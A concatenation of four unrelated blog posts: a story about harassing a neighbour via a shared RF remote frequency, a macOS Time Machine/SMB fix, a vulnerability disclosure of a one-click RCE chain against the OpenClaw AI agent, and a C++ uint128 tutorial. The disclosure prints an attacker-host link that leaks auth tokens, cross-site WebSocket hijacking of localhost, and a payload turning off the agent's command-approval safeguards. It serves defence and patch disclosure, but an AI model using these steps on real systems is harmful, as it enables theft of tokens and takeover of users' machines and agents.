    &lt;p&gt;The whole time I was watching TV, the channels kept randomly switching. I banged the remote on the table a couple of times, but it still switched. I removed the batteries from the remote, it still switched. I unplugged the device for a few minutes, plugged it back in, and… it still switched. Frustrated, I went through the device settings and disabled the RF remote. That's when it finally stopped. I wasn't happy with this solution, but it allowed me to watch TV until I figured something out.&lt;/p&gt;
    &lt;p&gt;One evening, when everyone was asleep and the neighbor was watching a loud TV show, I decided to diagnose the issue. The moment I pressed the power button on the RF remote, my TV and set-top box turned on, and the neighbor's TV went silent. "Fuck!" I heard someone say. I was confused. Did I just do that? The TV turned back on, the volume went up. I walked to the window armed with the remote. I counted to three, then pressed the power button. My neighbor's TV went silent. He growled.&lt;/p&gt;
    &lt;p&gt;I am the captain now.&lt;/p&gt;
    &lt;p&gt;Every time he turned the TV on, I pressed the power button again and his device went off. Well, what do you know? We had interference somehow. Our remotes were set up to operate at the same frequency. Each remote controlled both devices.&lt;/p&gt;
    &lt;p&gt;But I'm not that kind of neighbor. I wasn't going to continue to mess with him. Instead, I decided I would pay him a visit in the morning and explain that our remotes are tuned to the same frequency. I would bring the RF remote with me just to show him a demo. I was going to be a good neighbor.&lt;/p&gt;
    &lt;p&gt;In the morning, I went downstairs, remote in hand. I knocked on the door, and a gentleman in his forties answered the door. I had rehearsed my speech and presentation. This would be a good opportunity to build a good rapport, and have a shared story. Maybe he would tell me how he felt when the TV went off. How he thought there was a ghost in the house or something. But that's not what happened.&lt;/p&gt;
    &lt;p&gt;"Hi, I'm Ibrahim. Your upstairs neighbor..." I started and was interrupted almost immediately. "Whatever you are selling," he yelled. "I'm not buying." and he closed the door on my face. I knocked a second time, because obviously there was a misunderstanding. He never answered. Instead, the TV turned on and a movie played at high volume. So much for my prepared speech.&lt;/p&gt;
    &lt;p&gt;The RF settings on my set-top box remained turned off. My family never discovered its benefit anyway, they always pointed at the box when pressing the buttons. It wasn't much of an inconvenience. In fact, I later found in the manual that you could reprogram the device and remote to use a different frequency. I did not reprogram my remote. Instead, my family used the two IR remotes, and brought the RF remote in my bedroom where it permanently remained on my night stand.&lt;/p&gt;
    &lt;p&gt;Why in the bedroom? Because I decided to teach my neighbor some good manners. Whenever he turned up his volume, I would simply turn off his device. I would hear his frustration, and his attempts at solving the problem. Like a circus animal trainer, I remained consistent. If the volume of his TV went above what I imagined to be 15 to 20, I would press the power button. It became a routine for me for weeks. Some nights were difficult, I would keep the remote under my pillow, battling my stubborn neighbor all night.&lt;/p&gt;
    &lt;p&gt;One day, I noticed that I hadn't pressed the button in days. I opened the window and I could still hear the faint sound of his TV. Through trial and error, he learned the lesson. If the volume remained under my arbitrary threshold, the TV would remain on. But as soon as he passed that threshold, the device would turn off.&lt;/p&gt;
    &lt;p&gt;Sometimes, he would have company and there would be noise coming out of his apartment. I used the one tool in my tool box to send him a message. Turn off the TV. All of the sudden, my neighbor and his guest will be reminded of the unspoken rules, and become mindful of their neighbors.&lt;/p&gt;
    &lt;p&gt;Maybe somewhere on the web, in some obscure forum, someone asked the question: "Why does my set-top box turn off when I increase the volume?" Well, it might be 18 years too late, but there's your answer. There is a man out there who religiously sets his volume to 18. He doesn't quite know why. That's Pavlovian conditioning at its best.&lt;/p&gt;
  &lt;/main&gt;

  &lt;main&gt;
    &lt;p&gt;So… Here we are again.&lt;/p&gt;
    &lt;p&gt;Today, after a minor disaster with my Obsidian vault, I decided to restore from Time Machine, and… I realized that it had silently broken across both my Tahoe machines. I use a Synology NAS as Time Machine target, exporting the share over SMB and that has worked flawlessly for years, but this came as a surprise because I could have sworn it was working fine a couple of months ago–but no, it wasn’t.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;For clarity: It just stopped doing backups, silently. No error messages, no notifications, nothing. Just no backups for around two months. On my laptop, I only noticed because I was trying to restore a file and the latest backup was from December. On my desktop, I had a Thunderbolt external drive as a secondary backup.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;After some research, I found out that the issue is with Apple’s unilateral decision to change their SMB defaults (without apparently notifying anyone), and came across a few possible fixes.&lt;/p&gt;
    &lt;head rend="h2"&gt;What Seems To Be Working Now&lt;/head&gt;
    &lt;p&gt;I found this gist, which I am reproducing here for posterity, that seems to be working for me, but which entails editing the &lt;code&gt;nsmb.conf&lt;/code&gt; file on the Mac itself–which is not exactly ideal, since I’m pretty sure Apple will break this again in the future.&lt;/p&gt;
    &lt;code&gt;sudo nano /etc/nsmb.conf # I used vim, of course
&lt;/code&gt;
    &lt;p&gt;…and adding the following lines (the file should be empty):&lt;/p&gt;
    &lt;code&gt;[default]
signing_required=yes
streams=yes
soft=yes
dir_cache_max_cnt=0
protocol_vers_map=6
mc_prefer_wired=yes
&lt;/code&gt;
    &lt;p&gt;The explanation here is that macOS Tahoe changed the default from &lt;code&gt;signing_required=no&lt;/code&gt; to stricter control, and NAS devices with relaxed SMB settings cannot handle this without explicit configuration.&lt;/p&gt;
    &lt;p&gt;Another common pitfall is name encoding issues in machine names, so you should remove Non-ASCII Characters from the &lt;code&gt;.sparsebundle&lt;/code&gt; name (that wasn’t an issue for me, but YMMV).&lt;/p&gt;
    &lt;p&gt;On the Synology side, the recommendation was to go to &lt;code&gt;Control Panel &amp;gt; File Services &amp;gt; SMB &amp;gt; Advanced&lt;/code&gt; and set:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Maximum SMB protocol: SMB3&lt;/item&gt;
      &lt;item&gt;Enable Opportunistic Locking: Yes&lt;/item&gt;
      &lt;item&gt;Enable SMB2 Lease: Yes&lt;/item&gt;
      &lt;item&gt;Enable SMB Durable Handles: Yes&lt;/item&gt;
      &lt;item&gt;Server signing: No (or “Auto”)&lt;/item&gt;
      &lt;item&gt;Transport encryption: Disabled&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;That doesn’t quite match my DSM UI, but it’s close enough, and my settings now look like this:&lt;/p&gt;
    &lt;head rend="h2"&gt;My Backup Backup Plan&lt;/head&gt;
    &lt;p&gt;Since I’m tired of Apple breaking Time Machine every few years and the lack of transparency around this (it’s not Synology’s fault), I have decided to implement a more robust solution that doesn’t depend on Synology’s SMB implementation.&lt;/p&gt;
    &lt;p&gt;I already have a Proxmox server with ZFS as the backend storage that has an LXC container running Samba for general file sharing, so I decided to look into that as a possible Time Machine target.&lt;/p&gt;
    &lt;p&gt;As it happens, &lt;code&gt;mbentley/timemachine&lt;/code&gt; is a Docker image specifically designed for this purpose, and it seems to be well-maintained, so I’m testing it like this:&lt;/p&gt;
    &lt;code&gt;services:
  timemachine:
    image: mbentley/timemachine:smb
    container_name: timemachine
    restart: always
    network_mode: host
    environment:
      - TM_USERNAME=timemachine
      - TM_GROUPNAME=timemachine
      - PASSWORD=timemachine
      - TM_UID=65534 # 'nobody' user
      - TM_GID=65534 # 'nobody' group
      - SET_PERMISSIONS=false
      - VOLUME_SIZE_LIMIT=0
    volumes:
      # this is a pass-though mountpoint to the ZFS volume in Proxmox
      - /mnt/shares/timemachine:/opt/timemachine
    tmpfs:
      - /run/samba
&lt;/code&gt;
    &lt;p&gt;Right now the first option seems to be working, but I will probably switch to the Docker solution in the near future, since it gives me more control over the SMB implementation and avoids relying on Synology’s software.&lt;/p&gt;
    &lt;p&gt;But if anyone from Apple is reading this: please, stop breaking Time Machine every few years. It’s a critical piece of infrastructure for many users, and the lack of communication around these changes is frustrating.&lt;/p&gt;
    &lt;head rend="h2"&gt;A Minor, Yet Annoying, Additional Problem&lt;/head&gt;
    &lt;p&gt;Plus I’m annoyed enough that earlier this morning I tried to set up a new iOS device and the infamous &lt;code&gt;Restore in Progress: An estimated 100 MB will be downloaded…&lt;/code&gt; bug (which has bitten me repeatedly over the last six years) is still there.&lt;/p&gt;
    &lt;p&gt;The usual fix was hitting &lt;code&gt;Reset Network Settings&lt;/code&gt; and a full hardware reboot, plus reconnecting to Wi-Fi… But this time it took three attempts.&lt;/p&gt;
    &lt;p&gt;Come on, Apple, get your act together. Hire people who care about the OS experience, not just Liquid Glass.&lt;/p&gt;
  &lt;/main&gt;

  &lt;main&gt;&lt;p&gt;February 1, 2026&lt;/p&gt;&lt;p&gt;OpenClaw (formerly Moltbot and ClawdBot), the open-source AI personal assistant that can take actions on your behalf, is the most popular topic on X right now. It is already trusted by over 100,000 developers to hold the keys to their digital life, from iMessage/WhatsApp/Slack access to unrestricted local computer control. But when you grant an agent "god mode" permissions, the margin for error vanishes. While the community celebrated its capabilities, depthfirst General Security Intelligence silently audited its code and found a critical vulnerability. I investigated the finding, combined it with a vulnerability I discovered, and chained them into a 1-Click Remote Code Execution (RCE) exploit. With this exploit, a single visit to a malicious webpage was enough to hack your computer and AI assistant.&lt;/p&gt;&lt;p&gt;I’ll dissect the logic flaw depthfirst uncovered and walk you through the exact kill chain I built to weaponize it.&lt;/p&gt;&lt;p&gt;Codebases are rarely linear; logic is scattered, fragmented, and buried across dozens of files. That’s where the complexity and bugs hide.&lt;/p&gt;&lt;p&gt;Our system maps the full flow of an application's lifecycle. Here, our engine stitched together a data flow across the stack to reveal a critical logic gap:&lt;/p&gt;&lt;p&gt;1. Ingestion: &lt;code&gt;app-settings.ts&lt;/code&gt; blindly accepts a &lt;code&gt;gatewayUrl&lt;/code&gt; query parameter in the URL and persists it to storage. For example, &lt;code&gt;https://localhost?gatewayUrl=attacker.com&lt;/code&gt; would save &lt;code&gt;attacker.com&lt;/code&gt; as the new gateway url.&lt;/p&gt;&lt;code&gt;const gatewayUrlRaw = params.get("gatewayUrl");
...
if (gatewayUrlRaw != null) {
  const gatewayUrl = gatewayUrlRaw.trim();
  if (gatewayUrl &amp;amp;&amp;amp; gatewayUrl !== host.settings.gatewayUrl) {
    applySettings(host, { ...host.settings, gatewayUrl }); // persisted via saveSettings -&amp;gt; localStorage
  }
}
&lt;/code&gt;&lt;p&gt;2. Processing: &lt;code&gt;app-lifecycle.ts&lt;/code&gt; triggers &lt;code&gt;connectGateway()&lt;/code&gt; immediately after settings (such as the gateway url) are applied.&lt;/p&gt;&lt;code&gt;handleConnected(host) {
  ...
  connectGateway(host); // runs immediately on load after parsing URL params
  startNodesPolling(host);
  ...
}&lt;/code&gt;&lt;p&gt;3. Protocol Execution: gateway.ts automatically bundles the security-sensitive authToken into the system’s connection handshake to the new gateway.&lt;/p&gt;&lt;code&gt;const params = { ... , authToken, locale: navigator.language };
void this.request&amp;lt;GatewayHelloOk&amp;gt;("connect", params);&lt;/code&gt;&lt;p&gt;In isolation, each of these operations are safe. However, the depthfirst scan recognized that together, these operations create a critical security issue. Our engine flagged the dangerous pattern: clicking a URL can force a connection and leak the authentication token to an attacker.&lt;/p&gt;&lt;p&gt;Here’s a preview of the finding in the depthfirst UI:&lt;/p&gt;&lt;p&gt;Directly exploiting an insecurely configured internet-facing OpenClaw is trivial but limited in impact and scope.&lt;/p&gt;&lt;p&gt;These are the exploit steps:&lt;/p&gt;&lt;p&gt;1. The victim clicks a malicious link (or visits a site that forwards them to the malicious link), &lt;code&gt;http://victim_openclaw.com?gatewayUrl=ws://attacker.com:8080&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;2. The attacker listening to WebSocket connections on their server receives the &lt;code&gt;auth&lt;/code&gt; token.&lt;/p&gt;&lt;p&gt;3. The attacker logs in to the victim’s OpenClaw instance using the stolen token.&lt;/p&gt;&lt;p&gt;The attacker can now access the victim’s personal data and perform actions on the victim’s behalf. This can include reading text messages and Stripe API keys. Specific exploitation depends on which data the victim set up OpenClaw with.&lt;/p&gt;&lt;p&gt;This is bad enough, but this direct exploitation method has 3 limitations:&lt;/p&gt;&lt;p&gt;Here’s how I overcame those 3 limitations and demonstrated this vulnerability can be weaponized to achieve 1-Click remote code execution.&lt;/p&gt;&lt;code&gt;localhost&lt;/code&gt; Network Restrictions&lt;p&gt;Most users run OpenClaw on &lt;code&gt;localhost&lt;/code&gt;. As a result, their OpenClaw is inaccessible from the internet. Even if an attacker has a valid auth token, they can’t access a victim’s local OpenClaw. &lt;/p&gt;&lt;p&gt;However, I found a bug to bypass this otherwise frustrating restriction.&lt;/p&gt;&lt;p&gt;Regularly, &lt;code&gt;attacker.com&lt;/code&gt; can’t make arbitrary client-side requests to localhost. This is because Same Origin Policy (SOP) prevents separate origins (sites) from fully interacting with each other.&lt;/p&gt;&lt;p&gt;While browsers apply SOP to http connections, they do not to WebSocket ones. It’s a WebSocket server’s responsibility to validate a request's &lt;code&gt;origin&lt;/code&gt; and decide whether to accept the connection. I found that OpenClaw’s WebSocket server fails to validate the WebSocket &lt;code&gt;origin&lt;/code&gt; header, accepting requests from any site.&lt;/p&gt;&lt;p&gt;This allows me to perform Cross-Site WebSocket Hijacking (CSWSH). When the victim visits &lt;code&gt;attacker.com&lt;/code&gt;, I can run JavaScript on the victim’s browser to open a connection to &lt;code&gt;ws://localhost:18789&lt;/code&gt; . The browser acts as a pivot point between &lt;code&gt;attacker.com&lt;/code&gt; and the victim’s otherwise inaccessible &lt;code&gt;localhost&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;OpenClaw has robust safety features to limit the risk from agent-side threats. By default, it uses &lt;code&gt;exec-approvals.json&lt;/code&gt; to prompt the user before running dangerous commands, and it can be configured to run shell tools inside a containerized sandbox.&lt;/p&gt;&lt;p&gt;However, these protections are managed via the API itself. Because the stolen token grants &lt;code&gt;operator.admin&lt;/code&gt; and &lt;code&gt;operator.approvals&lt;/code&gt; scopes, I don't need to find a vulnerability in the sandbox implementation to bypass it. I can simply use the API to disable the safety features.&lt;/p&gt;&lt;code&gt;// Payload to disable user prompts
{
  "method": "exec.approvals.set",
  "params": { "defaults": { "security": "full", "ask": "off" } }
}&lt;/code&gt;&lt;p&gt;Putting it all together, the attack happens in milliseconds after the victim visits a webpage. The victim does not need to type anything or approve any prompts.&lt;/p&gt;&lt;code&gt;attacker.com&lt;/code&gt; executes on the victim browser, opening a background window to &lt;code&gt;http://victim_openclaw.com?gatewayUrl=ws://attacker.com:8080&lt;/code&gt;. This sends the auth token to &lt;code&gt;attacker.com:8080&lt;/code&gt;&lt;code&gt;attacker.com&lt;/code&gt; executing on the victim browser creates a WebSocket connection to &lt;code&gt;ws://localhost:18789&lt;/code&gt; (default OpenClaw server setup) and passes authentication using the stolen token. It then makes API request to: &lt;p&gt;Finally, to achieve arbitrary command execution, the attacker JavaScript executes a &lt;code&gt;node.invoke&lt;/code&gt; request:&lt;/p&gt;&lt;code&gt;{
     "type": "req",
     "id": "4",
     "method": "node.invoke",
     "params": {

}&lt;/code&gt;&lt;p&gt;The OpenClaw team quickly addressed and fixed the issue I reported. Here’s the GitHub Advisory. I found there was another person who found and reported the same bug. The patch adds a gateway URL confirmation modal, removing the auto-connect-without-prompt behavior.&lt;/p&gt;&lt;p&gt;All versions up to v2026.1.24-1 are vulnerable. Please upgrade your OpenClaw and rotate tokens if you suspect yours may have leaked.&lt;/p&gt;&lt;p&gt;depthfirst is building the intelligence layer to catch these logic flaws before the attackers do. If you’re shipping code, let's talk.&lt;/p&gt;&lt;p&gt;Secure your code to ship faster&lt;/p&gt;&lt;p&gt;Link your Github repo in three clicks.&lt;/p&gt;&lt;/main&gt;

    &lt;head rend="h1"&gt;Building Your Own Efficient uint128 in C++&lt;/head&gt;
    &lt;p&gt;A practical walk-through of a fixed-width uint128 implementation in modern C++.&lt;/p&gt;
    &lt;p&gt;We build a minimal &lt;code&gt;u128&lt;/code&gt; as two &lt;code&gt;u64&lt;/code&gt; limbs and implement arithmetic using carry, borrow, and multiply intrinsics that map directly to x64 instructions.
The generated code is on par with builtin &lt;code&gt;__uint128_t&lt;/code&gt; for addition, subtraction, multiplication, and comparison.
This is unsigned-only, x64-focused, and intentionally narrow in scope.
The result is a solid foundation for exact, fixed-width arithmetic with a focus on good codegen and predictability, not abstraction.&lt;/p&gt;
    &lt;p&gt;Full code and compiler output: https://godbolt.org/z/K6dn3s91Y&lt;/p&gt;
    &lt;head rend="h2"&gt;Scope&lt;/head&gt;
    &lt;p&gt;We take the smallest reasonable definition of a 128-bit integer, two 64-bit words, and turn it into a usable arithmetic type whose generated code is indistinguishable from a builtin &lt;code&gt;__uint128_t&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;This post is explicitly not about dynamically-sized big integer arithmetic. It is about being explicit with range bounds and letting the compiler emit the exact instructions we want. The scope is deliberately limited: unsigned arithmetic, fixed width, modern x64, with Clang and GCC as the primary targets and notes for MSVC where it differs.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why fixed-width big integers&lt;/head&gt;
    &lt;p&gt;In many domains, especially geometry and numerics, we do not need arbitrary precision. We need enough precision to be exact for known bounds, and we need the cost to be predictable.&lt;/p&gt;
    &lt;p&gt;Dynamic big integer libraries solve a different problem. They are flexible and general, but they pay for that generality in memory traffic, branches, and indirection. If your values fit into a fixed number of bits and you know that ahead of time, fixed-width arithmetic is usually the better trade. (In fact, our high-performance exact mesh booleans are completely built on this: Exact Arithmetic in Solidean)&lt;/p&gt;
    &lt;p&gt;A 128-bit integer is the gateway drug to fixed-width arithmetic. It is the smallest width that is no longer builtin, while still mapping cleanly to the underlying hardware. Once the carry and multiply patterns are explicit at 128 bits, extending them to 192 or 256 bits is straightforward. In production, we use 256-bit integers in our hot paths and go up to 564 bits for certain edge cases.&lt;/p&gt;
    &lt;head rend="h2"&gt;Representation&lt;/head&gt;
    &lt;p&gt;We represent a 128-bit unsigned integer as two 64-bit limbs. You can literally think of this as writing the &lt;code&gt;u128&lt;/code&gt; as a 2-digit number in base \(2^{64}\).
Because it's unsigned, we don't need to think about two's complement.&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;cstdint&amp;gt;
#include &amp;lt;immintrin.h&amp;gt; // _addcarry_u64, _subborrow_u64, _mulx_u64

// this is the type used in the intrinsics signature
// (and uint64_t is unsigned long, not unsigned long long...)
using u64 = unsigned long long;

struct u128
{
    u64 low = 0;
    u64 high = 0;
};
&lt;/code&gt;
    &lt;head rend="h2"&gt;Addition, with carry&lt;/head&gt;
    &lt;p&gt;We start off easy. Addition is simply done using long addition on our base \(2^{64}\) digits. The intrinsic &lt;code&gt;_addcarry_u64&lt;/code&gt; corresponds to the x64 instruction &lt;code&gt;adc&lt;/code&gt; and is exactly what we need:
Given two &lt;code&gt;u64&lt;/code&gt; summands and an input carry (0 or 1), we get the &lt;code&gt;u64&lt;/code&gt; result (via a slightly cumbersome output parameter) and a new carry.&lt;/p&gt;
    &lt;code&gt;u128 operator+(u128 a, u128 b) 
{
    u128 r;
    unsigned char c = _addcarry_u64(0, a.low,  b.low,  &amp;amp;r.low);
    (void)_addcarry_u64(c, a.high, b.high, &amp;amp;r.high);
    return r;
}
&lt;/code&gt;
    &lt;p&gt;The generated assembly is exactly what you would write by hand.&lt;/p&gt;
    &lt;code&gt;operator+(u128, u128):
        mov     rax, rdi
        add     rax, rdx
        adc     rsi, rcx
        mov     rdx, rsi
        ret
&lt;/code&gt;
    &lt;p&gt;The moves are just calling convention noise. The core is an &lt;code&gt;add&lt;/code&gt; (because the first addition has no input carry) followed by an &lt;code&gt;adc&lt;/code&gt;.
This is identical to what the compiler emits for &lt;code&gt;__uint128_t&lt;/code&gt; addition.&lt;/p&gt;
    &lt;p&gt;A small but important point is that intrinsics are preferable to inline assembly here. They act like specialized IR operations. The compiler understands their semantics, can schedule around them, and can still optimize aggressively. Inline assembly is more of a black box and much easier to get wrong or inhibit optimizations.&lt;/p&gt;
    &lt;head rend="h2"&gt;Subtraction: same story, inverted&lt;/head&gt;
    &lt;p&gt;Subtraction mirrors addition almost perfectly. Instead of a carry, we track a borrow. On x64, this is &lt;code&gt;sbb&lt;/code&gt;, subtract with borrow.
The corresponding intrinsic is &lt;code&gt;_subborrow_u64&lt;/code&gt;.&lt;/p&gt;
    &lt;code&gt;u128 operator-(u128 a, u128 b) 
{
    u128 r;
    unsigned char c = _subborrow_u64(0, a.low,  b.low,  &amp;amp;r.low);
    (void)_subborrow_u64(c, a.high, b.high, &amp;amp;r.high);
    return r;
}
&lt;/code&gt;
    &lt;p&gt;And again, the assembly is exactly what we want.&lt;/p&gt;
    &lt;code&gt;operator-(u128, u128):
        mov     rax, rdi
        sub     rax, rdx
        sbb     rsi, rcx
        mov     rdx, rsi
        ret
&lt;/code&gt;
    &lt;p&gt;At this point, addition and subtraction are basically solved. There is no hidden cost and no abstraction penalty. It's also easy to see how this scales to larger integer types with one extra instruction per &lt;code&gt;u64&lt;/code&gt; "digit".&lt;/p&gt;
    &lt;head rend="h2"&gt;Multiplication: regrouping our &lt;code&gt;u64&lt;/code&gt; digits&lt;/head&gt;
    &lt;p&gt;Multiplication is where things get more interesting. A 128-bit by 128-bit multiply produces a 256-bit result but we want only the lower 128 bit for our result. Same story with &lt;code&gt;u64 * u64&lt;/code&gt; really, which produces a 128 bit result in theory, but you usually only use the lower &lt;code&gt;u64&lt;/code&gt;.
Speaking of which, all modern 64-bit architectures give you access to fast &lt;code&gt;u64 * u64 -&amp;gt; u128&lt;/code&gt; instructions.
With BMI2, this is exposed as &lt;code&gt;_mulx_u64&lt;/code&gt;.
On MSVC, the equivalent is &lt;code&gt;_umul128&lt;/code&gt;.
This is our building block for large multiplication.&lt;/p&gt;
    &lt;p&gt;You can derive the code from writing the &lt;code&gt;u128 * u128&lt;/code&gt; as 2-digit long multiplication &lt;code&gt;(u64, u64) * (u64, u64)&lt;/code&gt; and then look sharply at what sums up to which digit.&lt;/p&gt;
    &lt;p&gt;That's how I do it on paper, but here we can also choose an algebraic route. Write the numbers as: $$ (a.\text{low} + 2^{64} \cdot a.\text{high}) \cdot (b.\text{low} + 2^{64} \cdot b.\text{high}) $$ Expanding this gives four terms. Of those, only three contribute to the low 128 bits:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;\(a_\text{low} \cdot b_\text{low}\) contributes both low and high parts&lt;/item&gt;
      &lt;item&gt;\(a_\text{low} \cdot b_\text{high}\) contributes to bits 64..127&lt;/item&gt;
      &lt;item&gt;\(a_\text{high} \cdot b_\text{low}\) contributes to bits 64..127&lt;/item&gt;
      &lt;item&gt;\(a_\text{high} \cdot b_\text{high}\) contributes only above bit 128 and can be discarded&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This works for larger integers as well, though summing up intermediate terms can produce carries for "higher digits".&lt;/p&gt;
    &lt;code&gt;u128 operator*(u128 a, u128 b) 
{
    // we want the low 128 bits of:
    // (a.low + 2^64 a.high) * (b.low + 2^64 b.high)
    //
    // r.low  = lo64(a.low * b.low)
    // r.high = hi64(a.low * b.low)
    //        + lo64(a.low * b.high)
    //        + lo64(a.high * b.low)        (mod 2^64)

    // NOTE (MSVC): for multiply, you can use _umul128(a, b, &amp;amp;hi) instead of _mulx_u64.
    //              Clang/GCC: _mulx_u64 is BMI2 and needs -mbmi2.

    u128 r;

    u64 p0_hi;
    r.low = _mulx_u64(a.low, b.low, &amp;amp;p0_hi);

    // cross terms: only the low 64 bits contribute to r.high
    u64 t1_hi;
    u64 t1_lo = _mulx_u64(a.low,  b.high, &amp;amp;t1_hi);

    u64 t2_hi;
    u64 t2_lo = _mulx_u64(a.high, b.low,  &amp;amp;t2_hi);

    // simply add is sufficient: carries would land in bit 128 and are discarded
    r.high = p0_hi + t1_lo + t2_lo;

    return r;
}
&lt;/code&gt;
    &lt;p&gt;Note that we do not need carry handling there. Any carry out of bit 127 would land in bit 128, which we are discarding anyway.&lt;/p&gt;
    &lt;p&gt;The compiler output reflects this reasoning.&lt;/p&gt;
    &lt;code&gt;operator*(u128, u128):
        mulx    r8, rax, rdi
        imul    rcx, rdi
        imul    rdx, rsi
        add     rdx, rcx
        add     rdx, r8
        ret
&lt;/code&gt;
    &lt;p&gt;The compiler chooses slightly different instructions and registers for the builtin &lt;code&gt;__uint128_t&lt;/code&gt; multiplication but is otherwise identical as well.&lt;/p&gt;
    &lt;head rend="h2"&gt;Equality&lt;/head&gt;
    &lt;p&gt;Now an easy one. &lt;code&gt;u128&lt;/code&gt; equality is simple structural equality.&lt;/p&gt;
    &lt;code&gt;bool operator==(u128 a, u128 b) 
{
    return a.low == b.low &amp;amp;&amp;amp; a.high == b.high;
}
&lt;/code&gt;
    &lt;p&gt;The generated assembly is worth a quick look.&lt;/p&gt;
    &lt;code&gt;operator==(u128, u128):
        xor     rdi, rdx
        xor     rsi, rcx
        or      rsi, rdi
        sete    al
        ret
&lt;/code&gt;
    &lt;p&gt;Instead of branching (as you might expect from the short-circuiting of &lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;), the compiler XORs the corresponding limbs.
XOR produces zero if and only if the inputs are equal.
ORing the results combines the checks.
If the final value is zero, both limbs were equal.&lt;/p&gt;
    &lt;p&gt;This pattern continues for larger integers, though we might see branching due to short-circuiting at some point. (We could of course just use the XOR approach in &lt;code&gt;operator==&lt;/code&gt; but it is distinctly less readable.)&lt;/p&gt;
    &lt;head rend="h2"&gt;Comparison: borrow beats branching&lt;/head&gt;
    &lt;p&gt;The straightforward way to compare two 128-bit integers is to compare the high parts first and then the low parts.&lt;/p&gt;
    &lt;code&gt;bool operator&amp;lt;(u128 a, u128 b)
{
    if (a.high != b.high) return a.high &amp;lt; b.high;
    return a.low &amp;lt; b.low;
}
&lt;/code&gt;
    &lt;p&gt;This is correct, but the codegen is not great:&lt;/p&gt;
    &lt;code&gt;operator&amp;lt;(u128, u128):
        xor     r8d, r8d
        cmp     rdi, rdx
        setb    r8b
        xor     eax, eax
        cmp     rsi, rcx
        setb    al
        cmove   eax, r8d
        ret
&lt;/code&gt;
    &lt;p&gt;Works, but heavier than necessary. We can do better by leaning on the hardware borrow flag.&lt;/p&gt;
    &lt;p&gt;Unsigned comparison &lt;code&gt;a &amp;lt; b&lt;/code&gt; is equivalent to checking whether &lt;code&gt;a - b&lt;/code&gt; produces a borrow:&lt;/p&gt;
    &lt;code&gt;bool operator&amp;lt;(u128 a, u128 b) 
{
    u64 dont_care;

    // compute borrow from (a.low - b.low). If a.low &amp;lt; b.low =&amp;gt; borrow = 1.
    unsigned char borrow = _subborrow_u64(0, a.low, b.low, &amp;amp;dont_care);

    // now subtract highs with that borrow
    // final borrow tells us if a &amp;lt; b in 128-bit unsigned.
    borrow = _subborrow_u64(borrow, a.high, b.high, &amp;amp;dont_care);

    return borrow != 0;
}
&lt;/code&gt;
    &lt;p&gt;The resulting assembly is minimal:&lt;/p&gt;
    &lt;code&gt;operator&amp;lt;(u128, u128):
        cmp     rdi, rdx
        sbb     rsi, rcx
        setb    al
        ret
&lt;/code&gt;
    &lt;p&gt;One compare, one subtract with borrow, and a flag check. This is exactly the kind of codegen we want in hot code.&lt;/p&gt;
    &lt;head rend="h2"&gt;A small use site&lt;/head&gt;
    &lt;p&gt;To make sure everything composes properly, let's build a slightly larger function.&lt;/p&gt;
    &lt;code&gt;u128 demo_u128(u128 a, u128 b) 
{
    u128 x = a + b;
    u128 y = a * b;
    return x &amp;lt; y
            ? y - x
            : x - y;
}
&lt;/code&gt;
    &lt;p&gt;All operators inline cleanly:&lt;/p&gt;
    &lt;code&gt;demo_u128(u128, u128):
        mov     r8, rdi
        add     r8, rdx
        mov     r9, rsi
        adc     r9, rcx
        mulx    rax, r10, rdi
        imul    rcx, rdi
        imul    rdx, rsi
        add     rdx, rcx
        add     rdx, rax
        mov     rax, r8
        sub     rax, r10
        mov     rcx, r9
        sbb     rcx, rdx
        jae     .LBB13_2
        sub     r10, r8
        sbb     rdx, r9
        mov     rax, r10
        mov     rcx, rdx
.LBB13_2:
        mov     rdx, rcx
        ret
&lt;/code&gt;
    &lt;p&gt;There is a branch for the ternary operator while the builtin version uses conditional moves instead. Which is better depends on data patterns but could go either way. I consider this basically as good as it gets.&lt;/p&gt;
    &lt;head rend="h2"&gt;Platform notes&lt;/head&gt;
    &lt;p&gt;The examples shown are for x64 with Clang or GCC.&lt;/p&gt;
    &lt;p&gt;On MSVC, &lt;code&gt;_addcarry_u64&lt;/code&gt; and &lt;code&gt;_subborrow_u64&lt;/code&gt; work the same way.
For multiplication, &lt;code&gt;_umul128&lt;/code&gt; replaces &lt;code&gt;_mulx_u64&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;On AArch64, the same approach applies using &lt;code&gt;adds&lt;/code&gt; and &lt;code&gt;adcs&lt;/code&gt; instructions for addition, &lt;code&gt;subs&lt;/code&gt; and &lt;code&gt;sbcs&lt;/code&gt; for subtraction, and &lt;code&gt;mul + umulh&lt;/code&gt; for the low + high half of a 64-bit multiply.
The patterns carry over directly, even though the intrinsics differ slightly (and multiplication is split into two parts).&lt;/p&gt;
    &lt;head rend="h2"&gt;Outlook&lt;/head&gt;
    &lt;p&gt;This &lt;code&gt;u128&lt;/code&gt; is the easiest large integer you can write.
Our goal is best performance, so we made sure that codegen is reasonably identical to the builtin &lt;code&gt;__uint128_t&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;From here, the same patterns extend naturally to signed variants, widening multiplies such as u128 times u128 to u256, and chains of fixed-width integers like i192 or i256. More importantly, the same reasoning applies when you design predicate-specific arithmetic that only computes what is actually needed.&lt;/p&gt;
    &lt;p&gt;A lot of our performance really boils down to these types: No &lt;code&gt;BigInteger&lt;/code&gt; tax, no floating predicates (that need a few kB of stack space for the worst case).
Just a lot of straightline integer code and some light static branching.&lt;/p&gt;
    &lt;head rend="h2"&gt;Addendum 2026-01-24&lt;/head&gt;
    &lt;p&gt;Some notes based on reader feedback.&lt;/p&gt;
    &lt;p&gt;On PowerPC: I don't know much about PowerPC or the availability of intrinsics, but the instructions you need are definitely there. For add/sub with carry, there's addc / adde for addition and subfc / subfe for subtraction with borrow. For wide multiplication, mulhdu gives you the high half of a 64-bit multiply (and mulhd for signed).&lt;/p&gt;
